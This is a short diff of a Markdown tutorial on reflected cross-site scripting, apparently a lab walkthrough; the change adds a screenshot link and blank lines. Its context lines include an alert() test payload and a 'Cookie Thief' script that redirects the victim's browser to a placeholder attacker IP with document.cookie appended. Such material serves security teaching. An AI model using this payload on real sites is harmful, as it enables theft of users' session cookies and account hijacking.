@@ -70,6 +70,9 @@ A classic and simple test is to inject a script that creates a pop-up alert:
 <script>alert('I am vulnerable!');</script>
 ```
 
+![vulnerable](https://github.com/user-attachments/assets/ac307802-ce79-4c5a-a85c-ea5a9d49183c)
+
+
 Enter this into the input box and click "Submit". If you see an alert box with the message "I am vulnerable!", you've confirmed the presence of a Reflected XSS vulnerability. The application took your input and executed it as code without proper sanitization.
 
 ### Step 2: Crafting the Malicious Script - The Cookie Thief
@@ -81,6 +84,8 @@ Now for the main event. We'll write a script that steals the victim's session co
   window.location='http://<YOUR_ATTACKER_IP>:8000/log?cookie=' + document.cookie;
 </script>
 ```
+
+
 
 Let's break this down:
 *   `window.location`: This JavaScript object is used to get the current page address (URL) and to redirect the browser to a new page.
